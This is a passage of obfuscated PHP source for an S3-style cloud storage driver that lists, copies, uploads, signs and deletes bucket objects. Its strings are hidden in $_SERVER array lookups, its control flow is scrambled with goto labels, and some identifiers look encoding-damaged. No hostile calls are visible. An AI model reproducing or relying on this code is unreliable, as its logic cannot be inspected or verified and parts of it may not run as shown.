SDK_DIR . $_SERVER[¨¤¼…´][187]; parent::__construct(); $this->_init($Eæ³ã£Š´Š); } public function _init($e»òøè¿‘) { foreach ($e»òøè¿‘ as $Dõ¬æóÅ¡ => $CÉåÍ´İ¡É) { if (isset($this->{$Dõ¬æóÅ¡})) { $this->{$Dõ¬æóÅ¡} = $CÉåÍ´İ¡É; } } $this->endpoint = $e»òøè¿‘[$_SERVER[¨¤¼…´][188]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $this->client->setEndpoint($this->getHost()); } public function signatureVersion($c ˆ”ä¢¤Œ = "\166\64") { $this->signVer = $c ˆ”ä¢¤Œ; $this->client->setSignatureVersion($c ˆ”ä¢¤Œ); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { return $this->client->getBucketCors($this->bucket); } public function isBucketCors() { goto F×¬¹Ìè°‹; F×¬¹Ìè°‹: $Aİà¾¿ÑĞ =& $_SERVER[¨¤¼…´]; $bÅÚõÑëà = $this->getBucketCors(); if (!$bÅÚõÑëà || !is_array($bÅÚõÑëà)) { return !1; } goto dòµˆÊ¡£Ø; B• Ä“ö: $ašØ³”•ò = array($Aİà¾¿ÑĞ[194], $Aİà¾¿ÑĞ[195], $Aİà¾¿ÑĞ[196], $Aİà¾¿ÑĞ[197], $Aİà¾¿ÑĞ[198]); $bº¥æ‘ïÃ = array_diff($ašØ³”•ò, $e”‰Ã¤ÀÀˆ); return empty($bº¥æ‘ïÃ); goto aÕ—Øºá©Î; dòµˆÊ¡£Ø: if ($bÅÚõÑëà[$Aİà¾¿ÑĞ[189]] != $Aİà¾¿ÑĞ[190] || $bÅÚõÑëà[$Aİà¾¿ÑĞ[191]] != $Aİà¾¿ÑĞ[190]) { return !1; } $e”‰Ã¤ÀÀˆ = array_map($Aİà¾¿ÑĞ[192], $bÅÚõÑëà[$Aİà¾¿ÑĞ[193]]); if (!is_array($e”‰Ã¤ÀÀˆ)) { $e”‰Ã¤ÀÀˆ = array(); } goto B• Ä“ö; aÕ—Øºá©Î: } public function mkfile($côí†Ù·Ğ®, $fÌÖ»Í…‚ = '', $DâŠÁ‹¥ìã = REPEAT_RENAME) { $F¡òà†¸ñ¢ = $this->setContent($côí†Ù·Ğ®, $fÌÖ»Í…‚); if ($F¡òà†¸ñ¢ !== !1) { return $this->getPathOuter($côí†Ù·Ğ®); } return !1; } public function mkdir($fÜ‹È²ïâ , $F‘Øá¯÷š¼ = REPEAT_SKIP) { if (empty($fÜ‹È²ïâ )) { return !1; } if ($this->_isFolder($fÜ‹È²ïâ )) { return $this->getPathOuter($fÜ‹È²ïâ ); } $Cšè²„«æ© = $this->setContent($fÜ‹È²ïâ , $_SERVER[¨¤¼…´][43], !0); if ($Cšè²„«æ© !== !1) { return $this->getPathOuter($fÜ‹È²ïâ ); } return !1; } public function copyFile($aáÉéî·Ôá, $F ÛÍ‘Ğ‚Œ, $c²õ÷›Ñ—æ = array()) { $a£ÄÂ¢ƒ·ì =& $_SERVER[¨¤¼…´]; $dŞ¹èÄ Üë = $this->objectMeta($aáÉéî·Ôá); if (!$dŞ¹èÄ Üë) { return !1; } if ($dŞ¹èÄ Üë[$a£ÄÂ¢ƒ·ì[87]] <= 1024 * 1024 * 200) { $D®¥èÀ…§» = $this->client->copyObject($this->bucket, $aáÉéî·Ôá, $this->bucket, $F ÛÍ‘Ğ‚Œ, $a£ÄÂ¢ƒ·ì[199], $c²õ÷›Ñ—æ); } else { $D®¥èÀ…§» = $this->client->multiCopyObject($this->bucket, $aáÉéî·Ôá, $this->bucket, $F ÛÍ‘Ğ‚Œ, $c²õ÷›Ñ—æ); } $D®¥èÀ…§» = $D®¥èÀ…§» ? $this->getPathOuter($F ÛÍ‘Ğ‚Œ) : !1; return $D®¥èÀ…§»; } public function moveFile($DšîÜİƒƒ¨, $d¦¿ãİÏ¢’) { if ($this->copyFile($DšîÜİƒƒ¨, $d¦¿ãİÏ¢’)) { $this->delFile($DšîÜİƒƒ¨); return $this->getPathOuter($d¦¿ãİÏ¢’); } return !1; } public function delFile($aåâó…Å˜—) { return $this->client->deleteObject($this->bucket, $aåâó…Å˜—); } public function delFolder($a—²§Éñ—ê) { goto BÙâğ¼À¦×; cÏ‡·½–¡: return $A×Ã¶¨Õ‘ === $d¥¡ĞÇ‹‚» ? !0 : !1; goto A‰¤®¹Åˆ…; E™–“íõ¬¯: $A×Ã¶¨Õ‘ = $d¥¡ĞÇ‹‚» = 0; $e§øì¿¨Úğ = array_chunk(array_keys($AõÖ¥ÑÂ), 1000); foreach ($e§øì¿¨Úğ as $B‚Ú ã£Á) { $A×Ã¶¨Õ‘++; $d¥¡ĞÇ‹‚» += (int) $this->client->deleteObjects($this->bucket, $B‚Ú ã£Á); } goto cÏ‡·½–¡; BÙâğ¼À¦×: $Bà‹ß—¢Ò =& $_SERVER[¨¤¼…´]; $AõÖ¥ÑÂ = $this->listObjs($a—²§Éñ—ê); if (!$AõÖ¥ÑÂ) { $a—²§Éñ—ê = trim($a—²§Éñ—ê, $Bà‹ß—¢Ò[8]); if (!empty($a—²§Éñ—ê)) { $a—²§Éñ—ê .= $Bà‹ß—¢Ò[8]; } return $this->delFile($a—²§Éñ—ê); } goto E™–“íõ¬¯; A‰¤®¹Åˆ…: } public function rename($C¿·Ğ½, $F½îÀİå±‘) { return $this->renameObject($C¿·Ğ½, $F½îÀİå±‘); } public function listPath($AÀÕô·¦İŒ, $C–Øåâ©Òâ = false) { $AÂò©Ä¾¶ä =& $_SERVER[¨¤¼…´]; $cÜˆ›Ø£ŸÜ = $this->listObjs($AÀÕô·¦İŒ, null, null, $AÂò©Ä¾¶ä[8]); $a²àÜèŸÉ = array($AÂò©Ä¾¶ä[84] => array(), $AÂò©Ä¾¶ä[83] => array()); foreach ($cÜˆ›Ø£ŸÜ as $cî˜“© => $FÖ³‡„æ³Æ) { if ($cî˜“© == $AÂò©Ä¾¶ä[8]) { continue; } if (isset($FÖ³‡„æ³Æ[$AÂò©Ä¾¶ä[200]])) { $a²àÜèŸÉ[$AÂò©Ä¾¶ä[84]][] = $this->folderInfo($FÖ³‡„æ³Æ[$AÂò©Ä¾¶ä[200]], $C–Øåâ©Òâ); } else { if (substr($FÖ³‡„æ³Æ[$AÂò©Ä¾¶ä[38]], -1) == $AÂò©Ä¾¶ä[8]) { continue; } $a²àÜèŸÉ[$AÂò©Ä¾¶ä[83]][] = $this->fileInfo($FÖ³‡„æ³Æ[$AÂò©Ä¾¶ä[38]], $C–Øåâ©Òâ, $FÖ³‡„æ³Æ); } } return $a²àÜèŸÉ; } private function fileInfo($fÈµ°ÚÚËÁ, $Có×¡±à ã = false, $d†ÃÁÛ‡œ„ = array()) { goto BÃ“›ÄÊíá; DË…ÙÚµğ: return $aÏ–ÌÔ‚Û; goto Dö–éø‘Å×; Eœ‚ë™¡åÃ: if (empty($d†ÃÁÛ‡œ„)) { $d†ÃÁÛ‡œ„ = $this->objectMeta($fÈµ°ÚÚËÁ); if (!$d†ÃÁÛ‡œ„) { return $aÏ–ÌÔ‚Û; } } if (isset($d†ÃÁÛ‡œ„[$cÜ‹ê¨›ß[204]])) { $aÏ–ÌÔ‚Û[$cÜ‹ê¨›ß[117]] = $d†ÃÁÛ‡œ„[$cÜ‹ê¨›ß[204]]; } if (isset($d†ÃÁÛ‡œ„[$cÜ‹ê¨›ß[87]])) { $aÏ–ÌÔ‚Û[$cÜ‹ê¨›ß[87]] = $d†ÃÁÛ‡œ„[$cÜ‹ê¨›ß[87]]; } goto DË…ÙÚµğ; BÃ“›ÄÊíá: $cÜ‹ê¨›ß =& $_SERVER[¨¤¼…´]; if ($Có×¡±à ã) { return array($cÜ‹ê¨›ß[38] => $this->pathThis($fÈµ°ÚÚËÁ), $cÜ‹ê¨›ß[85] => $this->getPathOuter($fÈµ°ÚÚËÁ), $cÜ‹ê¨›ß[39] => $cÜ‹ê¨›ß[181], $cÜ‹ê¨›ß[175] => $this->ext($fÈµ°ÚÚËÁ), $cÜ‹ê¨›ß[87] => isset($d†ÃÁÛ‡œ„[$cÜ‹ê¨›ß[87]]) ? $d†ÃÁÛ‡œ„[$cÜ‹ê¨›ß[87]] : 0, $cÜ‹ê¨›ß[201] => 0, $cÜ‹ê¨›ß[117] => 0, $cÜ‹ê¨›ß[202] => !0, $cÜ‹ê¨›ß[203] => !0); } $aÏ–ÌÔ‚Û = array($cÜ‹ê¨›ß[38] => $this->pathThis($fÈµ°ÚÚËÁ), $cÜ‹ê¨›ß[85] => $this->getPathOuter($fÈµ°ÚÚËÁ), $cÜ‹ê¨›ß[39] => $cÜ‹ê¨›ß[181], $cÜ‹ê¨›ß[201] => 0, $cÜ‹ê¨›ß[117] => 0, $cÜ‹ê¨›ß[87] => 0, $cÜ‹ê¨›ß[175] => $this->ext($fÈµ°ÚÚËÁ), $cÜ‹ê¨›ß[202] => !0, $cÜ‹ê¨›ß[203] => !0); goto Eœ‚ë™¡åÃ; Dö–éø‘Å×: } private function folderInfo($B¢Äª¯Õí„, $e“ç£Êø = false) { goto B…Ç¨·„ç; CÔÚ‡òŒâ: if ($B¢Äª¯Õí„ == $A·ß¤˜é[43]) { return $D¦‚×•¹—ó; } $B¢Äª¯Õí„ = trim($B¢Äª¯Õí„, $A·ß¤˜é[8]) . $A·ß¤˜é[8]; $bÂì¢á°¾æ = $this->objectMeta($B¢Äª¯Õí„); goto cô†åÙœ´ ; B…Ç¨·„ç: $A·ß¤˜é =& $_SERVER[¨¤¼…´]; if ($e“ç£Êø) { return array($A·ß¤˜é[38] => $this->pathThis($B¢Äª¯Õí„), $A·ß¤˜é[85] => $this->getPathOuter($A·ß¤˜é[8] . $B¢Äª¯Õí„), $A·ß¤˜é[39] => $A·ß¤˜é[86], $A·ß¤˜é[202] => !0, $A·ß¤˜é[203] => !0); } $D¦‚×•¹—ó = array($A·ß¤˜é[38] => $this->pathThis($B¢Äª¯Õí„), $A·ß¤˜é[85] => $this->getPathOuter($A·ß¤˜é[8] . $B¢Äª¯Õí„), $A·ß¤˜é[39] => $A·ß¤˜é[86], $A·ß¤˜é[201] => 0, $A·ß¤˜é[117] => 0, $A·ß¤˜é[202] => !0, $A·ß¤˜é[203] => !0); goto CÔÚ‡òŒâ; cô†åÙœ´ : if (isset($bÂì¢á°¾æ[$A·ß¤˜é[204]])) { $D¦‚×•¹—ó[$A·ß¤˜é[201]] = $bÂì¢á°¾æ[$A·ß¤˜é[204]]; } return $D¦‚×•¹—ó; goto f¼„§‡±˜¸; f¼„§‡±˜¸: } public function listObjs($Cƒì³Şš»¯, $AéãŞÓ±Šç = null, $bÈï¾Û¼¼ = null, $f¤Šš£ÍÄ· = null) { $dÖ†õ„õÖù =& $_SERVER[¨¤¼…´]; $Cƒì³Şš»¯ = trim($Cƒì³Şš»¯, $dÖ†õ„õÖù[8]); $b«éÏØ¿¬„ = empty($Cƒì³Şš»¯) ? $dÖ†õ„õÖù[43] : $Cƒì³Şš»¯ . $dÖ†õ„õÖù[8]; return $this->client->getBucket($this->bucket, $b«éÏØ¿¬„, $AéãŞÓ±Šç, $bÈï¾Û¼¼, $f¤Šš£ÍÄ·, !0); } public function has($aØ·ã¸Â÷Ê, $fŞ“®½®…¶ = false, $EÜ“İ‰Æ = true) { goto f°ĞÙ±Š; c†òİ¶¸¶›: $c‡‹¾·ïÍ– = $this->listObjs($aØ·ã¸Â÷Ê, null, null, $BŠÔ„†‡ĞÕ[8]); $c‡‹¾·ïÍ– = is_array($c‡‹¾·ïÍ–) ? $c‡‹¾·ïÍ– : array(); foreach ($c‡‹¾·ïÍ– as $c„¾¸ÕÀÍ÷) { if (isset($c„¾¸ÕÀÍ÷[$BŠÔ„†‡ĞÕ[38]]) && substr($c„¾¸ÕÀÍ÷[$BŠÔ„†‡ĞÕ[38]], -1) != $BŠÔ„†‡ĞÕ[8]) { if (!$fŞ“®½®…¶ && $EÜ“İ‰Æ) { return !0; } $Dä¾«Ğºç++; } else { if (isset($c„¾¸ÕÀÍ÷[$BŠÔ„†‡ĞÕ[200]])) { if (!$fŞ“®½®…¶ && !$EÜ“İ‰Æ) { return !1; } $FÄëµËŸëÎ++; } } } goto CÙ˜ò•ä­; f°ĞÙ±Š: $BŠÔ„†‡ĞÕ =& $_SERVER[¨¤¼…´]; $Dä¾«Ğºç = 0; $FÄëµËŸëÎ = 0; goto c†òİ¶¸¶›; CÙ˜ò•ä­: if ($fŞ“®½®…¶) { return array($BŠÔ„†‡ĞÕ[205] => $Dä¾«Ğºç, $BŠÔ„†‡ĞÕ[206] => $FÄëµËŸëÎ); } return !1; goto aßÖØ‰ºÃ„; aßÖØ‰ºÃ„: } public function listAll($FÀèèğ¶) { $FÜÇÍˆ¥Ğ­ =& $_SERVER[¨¤¼…´]; $C©š¬îà„ = $this->listObjs($FÀèèğ¶); $d¶‚÷Ü–óá = $dùóİäÉ§ = array(); foreach ($C©š¬îà„ as $b×óê¥Æ‘ğ => $fó†­Ê’ŒÉ) { $d¶‚÷Ü–óá[] = $fó†­Ê’ŒÉ[$FÜÇÍˆ¥Ğ­[38]]; $dùóİäÉ§[$b×óê¥Æ‘ğ] = $fó†­Ê’ŒÉ[$FÜÇÍˆ¥Ğ­[87]]; } return $this->listAllFiles($FÀèèğ¶, $d¶‚÷Ü–óá, $dùóİäÉ§); } public function canRead($FÃÍ©áî×µ) { $F¶Ï£îÉóè =& $_SERVER[¨¤¼…´]; $fˆğÏñòõ = $this->client->getAccessControlPolicy($this->bucket, $FÃÍ©áî×µ); if (!$fˆğÏñòõ) { return !1; } return in_array($fˆğÏñòõ, array($F¶Ï£îÉóè[207], $F¶Ï£îÉóè[208], $F¶Ï£îÉóè[209])) ? !0 : !1; } public function canWrite($FªŞÊ–£‡Ü) { $C¾»œ¥‰ÂÊ =& $_SERVER[¨¤¼…´]; $BÅÉ¶º…ÌÉ = $this->client->getAccessControlPolicy($this->bucket, $FªŞÊ–£‡Ü); if (!$BÅÉ¶º…ÌÉ) { return !1; } return in_array($BÅÉ¶º…ÌÉ, array($C¾»œ¥‰ÂÊ[207], $C¾»œ¥‰ÂÊ[208])) ? !0 : !1; } public function getContent($B´×¬²¢¹Ò) { return $this->client->getObject($this->bucket, $B´×¬²¢¹Ò); } public function setContent($Fì®šßÄÃ , $DÍÀ¦Õ˜ƒÆ = '', $Dœƒèõ©Ú¸ = false) { goto e¾¬«£»–©; e¾¬«£»–©: $aÆ¦Å×»õÏ =& $_SERVER[¨¤¼…´]; $Fì®šßÄÃ  = $Dœƒèõ©Ú¸ ? trim($Fì®šßÄÃ , $aÆ¦Å×»õÏ[8]) . $aÆ¦Å×»õÏ[8] : $Fì®šßÄÃ ; $CÓ·ˆ¯İÂÑ = get_file_mime(get_path_ext($Fì®šßÄÃ )); goto d±ôÜåÕ; EÕ÷è§µš: $this->cacheMethod(null, null); $eÁÖ“ë“ = $this->copyFile($Fì®šßÄÃ , $Fì®šßÄÃ , array($aÆ¦Å×»õÏ[210] => $eÁÖ“ë“[$aÆ¦Å×»õÏ[211]])); return $eÁÖ“ë“ ? !0 : !1; goto bÅÙàã×æ; d±ôÜåÕ: $eÁÖ“ë“ = $this->client->putObject($DÍÀ¦Õ˜ƒÆ, $this->bucket, $Fì®šßÄÃ , $aÆ¦Å×»õÏ[199], array(), $CÓ·ˆ¯İÂÑ); if (!$eÁÖ“ë“) { return !1; } if ($Dœƒèõ©Ú¸) { return !0; } goto EÕ÷è§µš; bÅÙàã×æ: } public function fileSubstr($aéİÜ›Í¸, $d”–®Ğî, $cîŒ—ÔàŒ) { $AŠ“¾¹»‰ç = $d”–®Ğî + $cîŒ—ÔàŒ - 1; return $this->client->getObject($this->bucket, $aéİÜ›Í¸, array($_SERVER[¨¤¼…´][212] => "\142\171\164\145\x73\x3d{$d”–®Ğî}\x2d{$AŠ“¾¹»‰ç}")); } public function upload($F©Â¨©­¬, $F¸®ççÛç, $fà³¥­ùÂÕ = false, $AŒ¦ßŒÙÉÏ = REPEAT_REPLACE) { $D·¬¦–„°õ =& $_SERVER[¨¤¼…´]; $aõ½ƒÖ¶³ğ = array($D·¬¦–„°õ[210] => @md5_file($F¸®ççÛç)); $BÈŠÀ´á¯‡ = array($D·¬¦–„°õ[213] => get_file_mime(get_path_ext($F©Â¨©­¬))); if (IO::size($F¸®ççÛç) <= 1024 * 1024 * 200) { $A èğÄ«È¦ = $this->client->putObjectFile($F¸®ççÛç, $this->bucket, $F©Â¨©­¬, $D·¬¦–„°õ[199], $aõ½ƒÖ¶³ğ, $BÈŠÀ´á¯‡); return !empty($A èğÄ«È¦) ? $this->getPathOuter($F©Â¨©­¬) : !1; } $bÏêë›¯İ‘ = $this->client->multiUploadObject($F¸®ççÛç, $this->bucket, trim($F©Â¨©­¬, $D·¬¦–„°õ[8]), $aõ½ƒÖ¶³ğ, $BÈŠÀ´á¯‡); return $bÏêë›¯İ‘ ? $this->getPathOuter($F©Â¨©­¬) : !1; } public function download($eßùæÁ¹¯, $cíÊÜã­è›) { if (!@is_dir($this->pathFather($cíÊÜã­è›)) && !IO::mkdir($this->pathFather($cíÊÜã­è›))) { return !1; } $a×ìÚëïÖ¿ = $this->client->getObject($this->bucket, $eßùæÁ¹¯, array(), $cíÊÜã­è›); return $a×ìÚëïÖ¿ !== !1 ? $cíÊÜã­è› : !1; } public function link($Bù‘†›°¡, $B¢ƒíÍù÷¡ = array()) { $FöÏÃÍìˆÄ =& $_SERVER[¨¤¼…´]; if ($this->signVer == $FöÏÃÍìˆÄ[214]) { return $this->client->getAuthenticatedURL($this->bucket, $Bù‘†›°¡, 3600 * 12, $B¢ƒíÍù÷¡); } return $this->client->getObjectUrl($this->accessKey, $this->secret, $this->bucket, trim($Bù‘†›°¡, $FöÏÃÍìˆÄ[8]), 3600 * 12, $this->region, array(), !0, $B¢ƒíÍù÷¡); } public function fileOut($FÏ²é¬ÒÌÃ, $aÎìºÊ»Ò = false, $C¹šõ‹ßõ = false, $bÚ®¿Ì‰á = '') { goto fªî‹¨ÕÊ÷; CŠãùÄØ‰æ: $DöÆ±¶”óÖ = get_file_mime(get_path_ext($C¹šõ‹ßõ)); if ($DöÆ±¶”óÖ == $eõÁØŠŒŠ¯[215]) { return parent::fileOut($FÏ²é¬ÒÌÃ, $aÎìºÊ»Ò, $C¹šõ‹ßõ, $bÚ®¿Ì‰á); } $aÎìºÊ»Ò = $aÎìºÊ»Ò ? $eõÁØŠŒŠ¯[216] : $eõÁØŠŒŠ¯[217]; goto eˆÇÙŒ˜; eˆÇÙŒ˜: $bÅ¯…‡Ã–” = array($eõÁØŠŒŠ¯[218] => $aÎìºÊ»Ò . $eõÁØŠŒŠ¯[219] . rawurlencode($C¹šõ‹ßõ), $eõÁØŠŒŠ¯[220] => $DöÆ±¶”óÖ); $a°ƒèğÈÎ  = $this->link($FÏ²é¬ÒÌÃ, $bÅ¯…‡Ã–”); $this->fileOutLink($a°ƒèğÈÎ ); goto Fó†¢™­Õ–; fªî‹¨ÕÊ÷: $eõÁØŠŒŠ¯ =& $_SERVER[¨¤¼…´]; if ($this->isFileOutServer()) { return $this->fileOutServer($FÏ²é¬ÒÌÃ, $aÎìºÊ»Ò, $C¹šõ‹ßõ, $bÚ®¿Ì‰á); } if (!$C¹šõ‹ßõ) { $C¹šõ‹ßõ = $this->pathThis($FÏ²é¬ÒÌÃ); } goto CŠãùÄØ‰æ; Fó†¢™­Õ–: } public function fileOutServer($A„İâ„, $eØñ‘Åô³Ø = false, $eŞŒù×…“ê = false, $CÉ­•‹«Ââ = '') { parent::fileOut($A„İâ„, $eØñ‘Åô³Ø, $eŞŒù×…“ê, $CÉ­•‹«Ââ); } public function fileOutImageServer($döŸ†åäİì, $BŞŞãËÛ = 250) { parent::fileOutImage($döŸ†åäİì, $BŞŞãËÛ); } public function hashMd5($cÃˆˆšË¡Ì, $eÀ“å‡ğ¨ = '') { $eæªßØ˜ˆ× =& $_SERVER[¨¤¼…´]; $d‹Æ†°Ÿ = $this->objectMeta($cÃˆˆšË¡Ì); if (!$d‹Æ†°Ÿ) { return !1; } $eÀ“å‡ğ¨ = $eÀ“å‡ğ¨ ? $eÀ“å‡ğ¨ : _get($d‹Æ†°Ÿ, $eæªßØ˜ˆ×[221]); $eÀ“å‡ğ¨ = $eÀ“å‡ğ¨ ? $eÀ“å‡ğ¨ : _get($d‹Æ†°Ÿ, $eæªßØ˜ˆ×[211], $eæªßØ˜ˆ×[43]); return $eÀ“å‡ğ¨; } public function uploadFormData($Dˆ°îéâÛõ, $d¨ÜÌğó‘´ = 3600) { $cùŞ»„°ËÇ =& $_SERVER[¨¤¼…´]; $CÔ±†ƒºİ› = $this->pathFather($Dˆ°îéâÛõ); $D×¢¸„ø” = $this->client->getHttpUploadPostParams($this->bucket, $CÔ±†ƒºİ›, $cùŞ»„°ËÇ[199], $d¨ÜÌğó‘´); return array_merge((array) $D×¢¸„ø”, array($cùŞ»„°ËÇ[183] => $this->getHost())); } public function multiUploadFormData($dí¤ÇÈï‡, $AÖ½˜Ü³›˜ = 3600) { $eÀÊ“˜îÛã =& $_SERVER[¨¤¼…´]; $Aê‡¤±ë = gmdate($eÀÊ“˜îÛã[222]); $aÍ¶©ˆ¶Û“ = array(); $F¦«…öô = $this->client->getUploadId($this->bucket, $dí¤ÇÈï‡, $aÍ¶©ˆ¶Û“); if (!$F¦«…öô) { return !1; } return array($eÀÊ“˜îÛã[223] => $F¦«…öô, $eÀÊ“˜îÛã[183] => $this->getHost() . $eÀÊ“˜îÛã[8] . $this->pathEncode($dí¤ÇÈï‡), $eÀÊ“˜îÛã[224] => $Aê‡¤±ë, $eÀÊ“˜îÛã[99] => $dí¤ÇÈï‡); } public function multiUploadAuthData($FÓø›ÉÁº÷, $dÎ“‰ìõÒ“ = array()) { goto b¸ŞõİÉ‹ƒ; B‹Óô–ÅÓ: if (strpos($E¬»ï½ÏÉ•, $FáĞäóÜ²Ò[227]) === 0) { return array($FáĞäóÜ²Ò[233] => $E×æ·¤éãÏ, $FáĞäóÜ²Ò[224] => $A‡®İ¦¦Ò); } return $E×æ·¤éãÏ; goto C£¨›ÚÂº™; b¾°Ğ»Ï‰: $bŞš¯íšìã = $dÎ“‰ìõÒ“[$FáĞäóÜ²Ò[99]]; unset($dÎ“‰ìõÒ“[$FáĞäóÜ²Ò[99]]); if (isset($dÎ“‰ìõÒ“[$FáĞäóÜ²Ò[225]])) { $dÎ“‰ìõÒ“[$FáĞäóÜ²Ò[224]] = $A‡®İ¦¦Ò; return $this->listUploadParts($bŞš¯íšìã, $dÎ“‰ìõÒ“); } goto DÚÎŞ™Š±Æ; DÚÎŞ™Š±Æ: $d„§¸£é®ê = array($FáĞäóÜ²Ò[226], $FáĞäóÜ²Ò[43], $FáĞäóÜ²Ò[126], $FáĞäóÜ²Ò[43], "\x78\55\141\155\172\x2d\x64\141\164\145\x3a{$A‡®İ¦¦Ò}", $FáĞäóÜ²Ò[8] . $this->bucket . $FáĞäóÜ²Ò[8] . $this->pathEncode($bŞš¯íšìã) . $E¬»ï½ÏÉ•); if (strpos($E¬»ï½ÏÉ•, $FáĞäóÜ²Ò[227]) === 0) { $d„§¸£é®ê[0] = $FáĞäóÜ²Ò[228]; } if (isset($dÎ“‰ìõÒ“[$FáĞäóÜ²Ò[229]]) && $dÎ“‰ìõÒ“[$FáĞäóÜ²Ò[229]] == $FáĞäóÜ²Ò[230]) { $d„§¸£é®ê[0] = $FáĞäóÜ²Ò[230]; } goto bšƒŞ³›à˜; b¸ŞõİÉ‹ƒ: $FáĞäóÜ²Ò =& $_SERVER[¨¤¼…´]; $A‡®İ¦¦Ò = isset($dÎ“‰ìõÒ“[$FáĞäóÜ²Ò[224]]) ? $dÎ“‰ìõÒ“[$FáĞäóÜ²Ò[224]] : gmdate($FáĞäóÜ²Ò[222]); $E¬»ï½ÏÉ• = isset($dÎ“‰ìõÒ“[$FáĞäóÜ²Ò[175]]) ? $dÎ“‰ìõÒ“[$FáĞäóÜ²Ò[175]] : $FáĞäóÜ²Ò[43]; goto b¾°Ğ»Ï‰; bšƒŞ³›à˜: $cÎäËç°Şà = implode($FáĞäóÜ²Ò[14], $d„§¸£é®ê); $Dîğ‰âåíö = base64_encode(hash_hmac($FáĞäóÜ²Ò[231], $cÎäËç°Şà, $this->secret, !0)); $E×æ·¤éãÏ = $FáĞäóÜ²Ò[232] . $this->accessKey . $FáĞäóÜ²Ò[4] . $Dîğ‰âåíö; goto B‹Óô–ÅÓ; C£¨›ÚÂº™: } public function listUploadParts($fÏ‘Õ‚¦ŠÊ, $eÕë¨µãÊø = array()) { goto C¬¢â›‰¤Ô; C¬¢â›‰¤Ô: $Cêğ¦òÄÜ =& $_SERVER[¨¤¼…´]; $Dé÷† ’ìª = str_replace($Cêğ¦òÄÜ[234], $Cêğ¦òÄÜ[43], $eÕë¨µãÊø[$Cêğ¦òÄÜ[175]]); $f¹½‹‘ã« = $this->client->listParts($this->bucket, $fÏ‘Õ‚¦ŠÊ, $Dé÷† ’ìª); goto BÕÒ¯íñî; F´Ö®Ä†•ë: $F¸ˆÜ‚‰† = $this->multiUploadAuthData($fÏ‘Õ‚¦ŠÊ, $eÕë¨µãÊø); if (empty($F¸ˆÜ‚‰†)) { return !1; } return array($Cêğ¦òÄÜ[233] => $F¸ˆÜ‚‰†, $Cêğ¦òÄÜ[224] => $eÕë¨µãÊø[$Cêğ¦òÄÜ[224]], $Cêğ¦òÄÜ[235] => $f¹½‹‘ã«); goto CÉö¢‚ã£‰; BÕÒ¯íñî: if (!$f¹½‹‘ã«) { return !1; } unset($eÕë¨µãÊø[$Cêğ¦òÄÜ[225]], $eÕë¨µãÊø[$Cêğ¦òÄÜ[229]]); $eÕë¨µãÊø[$Cêğ¦òÄÜ[99]] = $fÏ‘Õ‚¦ŠÊ; goto F´Ö®Ä†•ë; CÉö¢‚ã£‰: } public function getHost() { return parent::getHost() . $_SERVER[¨¤¼…´][8] . $this->bucket; } public function size($d»Ê©Óš“) { $FíöÎ§Š = $this->objectMeta($d»Ê©Óš“); return $FíöÎ§Š ? $FíöÎ§Š[$_SERVER[¨¤¼…´][87]] : 0; } public function info($EÙÊäÆŞ¼¹) { if ($this->isFolder($EÙÊäÆŞ¼¹)) { return $this->folderInfo($EÙÊäÆŞ¼¹); } else { if ($this->isFile($EÙÊäÆŞ¼¹)) { return $this->fileInfo($EÙÊäÆŞ¼¹); } } return !1; } public function exist($C‘®‚•„‡á) { return $this->isFile($C‘®‚•„‡á) || $this->isFolder($C‘®‚•„‡á); } public function isFile($DÔå‹Å¡É) { return !$this->isFolder($DÔå‹Å¡É) && $this->objectMeta($DÔå‹Å¡É); } public function isFolder($B„ÍÄ‡Ğƒš) { return $this->cacheMethod($_SERVER[¨¤¼…´][236], $B„ÍÄ‡Ğƒš); } protected function objectMeta($f­âÂ¡²Î) { return $this->cacheMethod($_SERVER[¨¤¼…´][237], $f­âÂ¡²Î); } protected function _objectMeta($fÆ½“èíØ‹) { $BõŸç¿¯¼´ =& $_SERVER[¨¤¼…´]; $fÆ½“èíØ‹ = rtrim($fÆ½“èíØ‹, $BõŸç¿¯¼´[8]); try { $EÙ“ÅºÆá = $this->client->getObjectInfo($this->bucket, $fÆ½“èíØ‹); if (!isset($EÙ“ÅºÆá[$BõŸç¿¯¼´[221]]) && isset($EÙ“ÅºÆá[$BõŸç¿¯¼´[238]])) { $EÙ“ÅºÆá[$BõŸç¿¯¼´[221]] = $EÙ“ÅºÆá[$BõŸç¿¯¼´[238]]; } } catch (Exception $E·×Â‘¥¥‚) { $EÙ“ÅºÆá = !1; } if (!$EÙ“ÅºÆá) { } return $EÙ“ÅºÆá; } protected function _isFolder($eÓ£È¡«–) { goto d›¸¦·Ã†; d›¸¦·Ã†: $bÆø®Ş²Î¡ =& $_SERVER[¨¤¼…´]; $eÓ£È¡«– = rtrim($eÓ£È¡«–, $bÆø®Ş²Î¡[8]); if ($eÓ£È¡«– == $bÆø®Ş²Î¡[43] || $eÓ£È¡«– == $bÆø®Ş²Î¡[8]) { return !0; } goto DĞîñŸ¾Šá; E÷¬©ÁÆĞ¥: if (substr($dõÖ‚Ë²ßğ[0][$bÆø®Ş²Î¡[38]], -1) == $bÆø®Ş²Î¡[8]) { return !0; } if (get_path_this($dõÖ‚Ë²ßğ[0][$bÆø®Ş²Î¡[38]]) == get_path_this($eÓ£È¡«–)) { return !1; } return !0; goto fŸ‹»ïÛó; DĞîñŸ¾Šá: $dõÖ‚Ë²ßğ = $this->client->getBucket($this->bucket, $eÓ£È¡«–, null, 1); if (empty($dõÖ‚Ë²ßğ)) { return !1; } $dõÖ‚Ë²ßğ = array_values($dõÖ‚Ë²ßğ); goto E÷¬©ÁÆĞ¥; fŸ‹»ïÛó: } } goto A¸Ï„ƒ‡ƒ¹; d³¶¥øÔ‹: class PathDriverEOS extends PathDriverBaseS3 { public function __construct($B’š¤ãÇ¢) { parent::__construct($B’š¤ãÇ¢); $this->signatureVersion($_SERVER[¨¤¼…´][214]); } public function uploadFormData($fòµª›Ÿ½µ, $c³ê¦§¨êÓ = 3600) { goto d‘¶ÓÊšàì; Cæš”‰Ô§: $AÜ²»åŸ‰å = $EÙ˜¤Œ›×Â[1126]; $eÉ¹”š­á = $c³ê¦§¨êÓ . $EÙ˜¤Œ›×Â[43]; $CÄËØÚå… = $EÙ˜¤Œ›×Â[1090]; goto F…ùšŸŠ¿Ò; F…ùšŸŠ¿Ò: $DµƒÖ·È“ = array($this->accessKey, $B“ÚÈˆ÷, $this->region, $fÌÀ ¦…Œ«, $AÜ²»åŸ‰å); $F¿è‰±Õå¬ = implode($EÙ˜¤Œ›×Â[8], $DµƒÖ·È“); $dé”Î‹Š£Œ = 